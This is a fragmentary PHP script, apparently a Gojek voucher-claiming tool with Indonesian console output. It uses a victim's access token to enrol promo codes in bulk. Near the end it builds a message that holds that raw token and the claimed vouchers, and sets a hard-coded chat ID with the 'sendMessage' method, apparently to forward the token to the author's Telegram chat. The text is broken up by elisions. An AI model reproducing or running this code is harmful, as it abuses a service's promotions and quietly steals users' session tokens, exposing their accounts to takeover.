...
{
echo color("nevy","        Proses menuju Token                  \n");
...
$token = $accesstoken;
        {
        echo color("purple","▬▬▬▬▬▬▬▬▬▬▬▬CLAIM VOUCHER▬▬▬▬▬▬▬▬▬▬▬▬");
        echo "\n".color("nevy"," 1. Claim GO-MART . . .");
        echo "\n".color("purple","Please wait  ");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(0);
        }
         $code1 = request5('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"HARIJADIMART"}');
        ...
        echo"\n";
         ...
         $chatid = "1127649087";
         $pesan 	= "♤ Gojek Account Info By : pak abdullah \n\n [bung.php] \n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]";
         $method	= "sendMessage";
